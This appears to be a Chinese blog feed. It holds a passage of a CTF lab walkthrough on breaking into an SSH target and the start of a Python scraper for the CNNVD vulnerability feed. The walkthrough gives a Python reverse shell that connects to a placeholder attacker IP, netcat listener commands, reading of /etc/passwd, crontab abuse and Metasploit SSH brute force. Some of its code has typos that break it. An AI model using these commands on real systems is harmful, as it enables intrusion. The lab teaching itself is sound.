Group）所定制：SSH未建立在应用层基础上的安全协议<br>SSH是目前较为可靠，专门为远程登录会话和其他网络服务提供安全性的协议，利用SSH协议可以有效防止远程管理过程中信息泄露的问题。<br>SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH在正确使用时可弥补网络中的漏洞。SSH客户端适用于多个平台，几乎所有UNIX平台，Windows平台以及MAC平台，都可以运行SHH，它是基于TCP 22号端口的服务。</p><h2 id="3-2-SSH协议认证机制"><a href="#3-2-SSH协议认证机制" class="headerlink" title="3.2 SSH协议认证机制"></a>3.2 SSH协议认证机制</h2><ol><li><p>基于口令的安全验证<br>只要你自己知道账号和口令，就可以登陆到远程主机。所有传输的数据都会被加密，但是不能保证你正在连接的服务器就是你想要的连接的服务器。可能会有别的服务器在冒充真正的服务器，也就是受到“中间人” 这种方式的攻击。</p></li><li><p>基于秘钥的安全验证<br>需要依靠秘钥，也就是你必须为自己穿件一对秘钥，并把公钥放在需要访问的服务器上，如果你要连接到SSH服务器上，客户端软件就会向服务器发出请求，请求用你的私有秘钥进行安全验证。服务器收到请求之后，先在该服务器上你的主目录下寻找你的公用秘钥，然后把它和你发送过来的私有秘钥进行比较。如果两个秘钥一致，则验证成功，登陆服务器。</p><blockquote><p>id_rsa就是尼的私钥，而id_rsa.pub则是你的公钥</p></blockquote></li></ol><h2 id="3-3-SSH协议验证机制弱点"><a href="#3-3-SSH协议验证机制弱点" class="headerlink" title="3.3 SSH协议验证机制弱点"></a>3.3 SSH协议验证机制弱点</h2><ol><li><p>基于口令的安全验证<br>基于字典的暴力破解，破解对应用户名和密码，通过SSH客户端连接到远程主机的SSH服务，实现对服务器的一定控制（不一定为root权限）</p></li><li><p>基于秘钥的安全验证<br>通过对主机信息收集，获取到泄露的用户名和对应的秘钥。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br><span class="line">ssh -i id_rsa 用户名@主机地址 登陆服务器。（不一定是root权限）</span><br></pre></td></tr></table></figure></li></ol><h2 id="3-4-信息探测"><a href="#3-4-信息探测" class="headerlink" title="3.4 信息探测"></a>3.4 信息探测</h2><p>对于给定IP地址的靶场机器，对其进行渗透测试，首先需要考虑靶场机器开放的服务。</p><ol><li><p>探测靶场开放的服务于服务版本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 靶场IP地址</span><br></pre></td></tr></table></figure></li><li><p>探测靶场全部信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -v 靶场IP地址</span><br></pre></td></tr></table></figure></li><li><p>探测靶场的操作系统类型与版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O 靶场IP地址</span><br></pre></td></tr></table></figure></li></ol><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831151755.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831151813.png" class="lozad"></p><h2 id="3-5-分析探测结果"><a href="#3-5-分析探测结果" class="headerlink" title="3.5 分析探测结果"></a>3.5 分析探测结果</h2><p>对于SSH服务的22端口的靶场，首先考虑，</p><ol><li>暴力破解</li><li>私钥泄露（私钥有没有对应的密码、是否可以找到私钥的用户名）</li></ol><p>对于开放http服务的80端口或者其他端口的靶场,首先考虑:</p><ol><li>通过浏览器访问对应的靶场http服务，如http://靶场ip地址：http服务端口</li><li>使用探测工具对http的目录进行探测，如dirb http://靶场IP地址：http服务端口</li></ol><p><strong>特别注意特殊端口，如8080等大端口号。</strong></p><h2 id="3-6-挖掘敏感信息"><a href="#3-6-挖掘敏感信息" class="headerlink" title="3.6 挖掘敏感信息"></a>3.6 挖掘敏感信息</h2><p>使用浏览器对靶场ip的http服务探测，对页面种展示的内容也要注意，尤其是联系人等信息（有可能就是SSH的用户名信息），递归访问，力争把每一个dirb扫描到的目录页面都访问查看。<br>尤其对robotx.txt，以及一些目录进行访问，挖掘具备利用价值的信息。对于开放ssh服务的靶场，务必要注意是否可以寻找到SSH私钥信息（id_rsa）</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831152536.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831152554.png" class="lozad"></p><p>挖掘到私钥信息</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831152607.png" class="lozad"></p><p>对于某些靶场，也可以使用nikto扫描器来挖掘敏感信息<br>nikto -host 靶场IP地址<br>特别注意config 等特殊敏感文件，要细读扫描的结果，挖掘可以利用的敏感信息</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831152706.png" class="lozad"></p><h2 id="3-7-利用敏感、弱点信息"><a href="#3-7-利用敏感、弱点信息" class="headerlink" title="3.7 利用敏感、弱点信息"></a>3.7 利用敏感、弱点信息</h2><p>对挖掘到的SSH秘钥利用</p><ol><li><p>修改id_rsade 权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br></pre></td></tr></table></figure></li><li><p>利用私钥登陆服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa 用户名@靶场IP地址</span><br></pre></td></tr></table></figure></li></ol><p><strong>注意：如果id_rsa没有解密密码，可以直接使用。但是如果id_rsa有机密密码，那么就需要进行对应的破解。</strong></p><p>使用wget远程下载靶机上的文件</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831154141.png" class="lozad"></p><p>将权限修改为600权限</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831154207.png" class="lozad"></p><p>尝试进行远程终端连接</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831154235.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831154313.png" class="lozad"></p><h2 id="3-8-扩大战果"><a href="#3-8-扩大战果" class="headerlink" title="3.8 扩大战果"></a>3.8 扩大战果</h2><p>登陆服务器之后，我们需要做一下操作：</p><ol><li>查看当前用户whoami</li><li>id 查看当前用户的权限</li><li>查看根目录寻找flag文件,如果是root权限，那么表明这个靶场就被全部拿下，但是如果不时，就肯定需要提权。一般情况下，flag文件只属于root用户和对应的用户组。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd  //查看所有用户的列表</span><br><span class="line">cat /etc/group  //查看用户组</span><br><span class="line">find / -user 用户名  //查看属于某些用户的文件</span><br><span class="line">/tmp   //查看缓存文件目录</span><br></pre></td></tr></table></figure><h2 id="3-9-深入挖掘"><a href="#3-9-深入挖掘" class="headerlink" title="3.9 深入挖掘"></a>3.9 深入挖掘</h2><p>通过/etc/crontab文件，设定系统定期执行的任务，编辑，需要root权限。不同的用户都可以有不同的定时任务。<br>cat /etc/crontab 挖掘其他用户是否有定时任务，并查看对应的任务内容。执行的任务肯定对靶场机器的某个文件。<br>如果在/etc/crontab 下有某个用户的定时计划文件，但是具体目录下没有这个定时执行文件，可以自行创建反弹shell，然后netcat执行监听获取对应用户的权限。<br>如果有定时执行的文件，可以切换到对应的目录，查看对应的权限，查看当前用户是否有读写权限。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831155105.png" class="lozad"></p><h2 id="3-10-反弹shell"><a href="#3-10-反弹shell" class="headerlink" title="3.10 反弹shell"></a>3.10 反弹shell</h2><p>靶场代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#！/usr/bin/python  ##环境变量的书写</span><br><span class="line">import os,subprocess,socket #导入第三方库</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = socket.socekt(socket.AF_INET,socket.SOCK_STREAM) #创建套接字</span><br><span class="line">s.connect(&quot;攻击机ip地址&quot;,&quot;攻击机监听端口&quot;) #利用套接字连接到攻击机的ip地址，以及攻击机监听的端口号</span><br><span class="line"></span><br><span class="line">#将标准输入输出，以及错误输入输出</span><br><span class="line">os.dup2(s.fileno(),0) </span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line">p = subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])</span><br></pre></td></tr></table></figure><p>攻击机<code>netcat</code>命令：<code>nc -lpv 未占用端口</code></p><blockquote><p>说明：</p><p>l 表示监听模式</p><p>P 表示端口号</p><p>v 表示返回详细信息</p></blockquote><p>查看占用端口<code>netstat -pantu</code></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831155609.png" class="lozad"></p><h2 id="3-11-背水一战"><a href="#3-11-背水一战" class="headerlink" title="3.11 背水一战"></a>3.11 背水一战</h2><p>万不得已的时候只能对ssh服务进行暴力破解。破解最后一个用户名。破解工具如hydra、medusa等</p><p>利用cupp创建字典</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/jeanphorn/common-password.git</span><br><span class="line">chmod +x cupp.py</span><br><span class="line">./cupp.py -i #以交互的方式创建字典</span><br></pre></td></tr></table></figure><h2 id="3-12-使用metasploit破解SSH"><a href="#3-12-使用metasploit破解SSH" class="headerlink" title="3.12 使用metasploit破解SSH"></a>3.12 使用metasploit破解SSH</h2><p>在终端输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf&gt; use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">msf auxiliary(ssh_login)&gt;set rhosts 192.168.1.137</span><br><span class="line">msf auxiliary(ssh_login)&gt;set username hadi</span><br><span class="line">msf auxiliary(ssh_login)&gt;set pass_file hadi.txt</span><br><span class="line">msf auxiliary(ssh_login)&gt;run</span><br></pre></td></tr></table></figure><p>优化会话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c “import pty;pty.spqwn(&apos;/bin/bash&apos;)”</span><br><span class="line">su - root</span><br></pre></td></tr></table></figure><blockquote><p>注：暴力破解ssh可以使用超级弱口令工具，支持爆破SSH,FTP,MYSQL等弱口令，Windows版本。</p><p>GitHub地址：<a href="https://github.com/shack2/SNETCracker" target="_blank" rel="noopener">https://github.com/shack2/SNETCracker</a></p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831231712.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831231727.png" class="lozad"></p><h2 id="3-13-获取Flag"><a href="#3-13-获取Flag" class="headerlink" title="3.13 获取Flag"></a>3.13 获取Flag</h2><p>提升到root权限之后，切换目录寻找flag文件。一般情况下，flag文件是在root目录下。<br>cat flag文件名（一般情况 flag.txt）</p><h2 id="3-14-总结"><a href="#3-14-总结" class="headerlink" title="3.14 总结"></a>3.14 总结</h2><p>在对SSH服务渗透中，大部分情况是利用获取的私钥文件，直接使用用户名和私钥文件登陆靶场机器，个别情况进行暴力破解获取用户密码，通过用户名和对应用户登陆靶场机。<br>CTF中要特别注意 /tmp数据缓冲目录 以及 /etc/crontab 设置定时之行文件</p><h1 id="0x04-CTF夺旗之SMB信息泄露"><a href="#0x04-CTF夺旗之SMB信息泄露" class="headerlink" title="0x04 CTF夺旗之SMB信息泄露"></a>0x04 CTF夺旗之SMB信息泄露</h1><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 夺旗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬取CNNVD上的漏洞预警</title>
      <link href="/2019/08/30/%E7%88%AC%E5%8F%96CNNVD%E4%B8%8A%E7%9A%84%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6/"/>
      <url>/2019/08/30/%E7%88%AC%E5%8F%96CNNVD%E4%B8%8A%E7%9A%84%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>由于公司原因，本人出差一周，在出差的工作任务有记录CNNVD漏洞预警这项任务，而这样任务简直就是重复造轮子的任务，Ctrl + C ，Ctrl + V ，毫无技术含量不说，还会浪费很多时间，so，我想用爬虫来解决，但是，我又不会写，哈哈，那就百度喽。幸运的是，在百度上找到了爬虫的源码。</p><p><img alt data-src="https://img02.sogoucdn.com/app/a/100520093/e18d20c94006dfe0-2857e2f09ca9e0a0-a458d10c6b7a1d65b27c80fba9904fa9.jpg" class="lozad"></p><a id="more"></a><h1 id="0x01-开搞"><a href="#0x01-开搞" class="headerlink" title="0x01 开搞"></a>0x01 开搞</h1><blockquote><p>环境需求：</p><ol><li><p>python 3.x 版本</p></li><li><p>若干第三方模块</p></li></ol></blockquote><h2 id="1-1-python代码"><a href="#1-1-python代码" class="headerlink" title="1.1 python代码"></a>1.1 python代码</h2><p>首先先放出代码，这个代码是在百度上找的，我觉得最好的一个代码了，可以自定义爬行的时间范围和页数，真牛X。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr</span></span><br><span class="line"><span class="comment">#import urllib.request/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> http.cookiejar</span><br><span class="line"><span class="keyword">import</span> xlwt</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> xlsxwriter</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">运行方法：</span></span><br><span class="line"><span class="string">python vulnerabilities_crawler 2017-10-01 2017-10-07 178</span></span><br><span class="line"><span class="string">第一个为开始时间，第二个为结束时间，第三个为总页数。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获得漏洞详情链接列表</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vulnerabilities_url_list</span><span class="params">(url,start_time,end_time)</span>:</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Linux; Android 4.1.2; Nexus 7 Build/JZ054K) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">        <span class="string">'Referer'</span>: <span class="string">'http://cnnvd.org.cn/web/vulnerability/queryLds.tag'</span></span><br><span class="line">    &#125;    </span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'qstartdate'</span>:<span class="string">'2017-10-30'</span>,                <span class="comment">#---------------》开始日期</span></span><br><span class="line">        <span class="string">'qenddate'</span>:<span class="string">'2017-10-31'</span>                    <span class="comment">#---------------》结束日期</span></span><br><span class="line">    &#125;</span><br><span class="line">    data[<span class="string">'qstartdate'</span>] = start_time </span><br><span class="line">    data[<span class="string">'qenddate'</span>] = end_time</span><br><span class="line">    data = parse.urlencode(data).encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    vulnerabilities_url_html = urllib.request.Request(url,headers=header,data=data)</span><br><span class="line">    vulnerabilities_url_cookie = http.cookiejar.CookieJar()</span><br><span class="line">    vulnerabilities_url_opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(vulnerabilities_url_cookie))</span><br><span class="line">    vulnerabilities_url_html = vulnerabilities_url_opener.open(vulnerabilities_url_html)</span><br><span class="line">    vulnerabilities_url_html = zlib.decompress(vulnerabilities_url_html.read(), <span class="number">16</span>+zlib.MAX_WBITS)</span><br><span class="line">    vulnerabilities_url_html = vulnerabilities_url_html.decode()</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#提取漏洞详情链接</span></span><br><span class="line">    response = <span class="string">r'href="(.+?)" target="_blank" class="a_title2"'</span></span><br><span class="line">    vulnerabilities_link_list = re.compile(response).findall(vulnerabilities_url_html)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#添加http前序</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> vulnerabilities_link_list:</span><br><span class="line">        vulnerabilities_lists.append(<span class="string">'http://cnnvd.org.cn'</span>+vulnerabilities_link_list[i])</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        print(<span class="string">"已完成爬行第%d个漏洞链接"</span>%i)</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#漏洞信息爬取函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vulnerabilities_data</span><span class="params">(url)</span>:</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, sdch'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    vulnerabilities_data_html = urllib.request.Request(url,headers=header)</span><br><span class="line">    vulnerabilities_data_cookie = http.cookiejar.CookieJar()</span><br><span class="line">    vulnerabilities_data_opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(vulnerabilities_data_cookie))</span><br><span class="line">    vulnerabilities_data_html = vulnerabilities_data_opener.open(vulnerabilities_data_html)</span><br><span class="line">    vulnerabilities_data_html = zlib.decompress(vulnerabilities_data_html.read(), <span class="number">16</span>+zlib.MAX_WBITS)</span><br><span class="line">    vulnerabilities_data_html = vulnerabilities_data_html.decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">global</span> vulnerabilities_result_list</span><br><span class="line">    vulnerabilities_result_list=[]    <span class="comment">#抓取信息列表命名</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#添加漏洞信息详情</span></span><br><span class="line">    vulnerabilities_detainled_soup1 = BeautifulSoup(vulnerabilities_data_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    vulnerabilities_detainled_data = vulnerabilities_detainled_soup1.find(<span class="string">'div'</span>,attrs=&#123;<span class="string">'class'</span>:<span class="string">'detail_xq w770'</span>&#125;)    <span class="comment">##定义 漏洞信息详情 块的soup</span></span><br><span class="line">    vulnerabilities_detainled_data = vulnerabilities_detainled_data.decode()</span><br><span class="line">    vulnerabilities_detainled_soup = BeautifulSoup(vulnerabilities_detainled_data,<span class="string">'html.parser'</span>)    <span class="comment">#二次匹配    </span></span><br><span class="line"></span><br><span class="line">    vulnerabilities_detainled_data_list = vulnerabilities_detainled_soup.find_all(<span class="string">'li'</span>)    <span class="comment">#标签a信息汇总    </span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_name = vulnerabilities_detainled_soup.h2.string    <span class="comment">#漏洞名称</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_name = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_name)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_cnnvd_num = vulnerabilities_detainled_soup.span.string    <span class="comment">#cnnvd编号</span></span><br><span class="line">        vulnerabilities_cnnvd_num = re.findall(<span class="string">r"\：([\s\S]*)"</span>,vulnerabilities_cnnvd_num)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_cnnvd_num = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_cnnvd_num)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:                            <span class="comment">#漏洞等级</span></span><br><span class="line">        vulnerabilities_rank = vulnerabilities_detainled_soup.a.decode()</span><br><span class="line">        vulnerabilities_rank = re.search(<span class="string">u'([\u4e00-\u9fa5]+)'</span>,vulnerabilities_rank).group(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_rank = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_rank)</span><br><span class="line"></span><br><span class="line">    vulnerabilities_cve_html = vulnerabilities_detainled_data_list[<span class="number">2</span>].decode()    <span class="comment">#漏洞cve编号</span></span><br><span class="line">    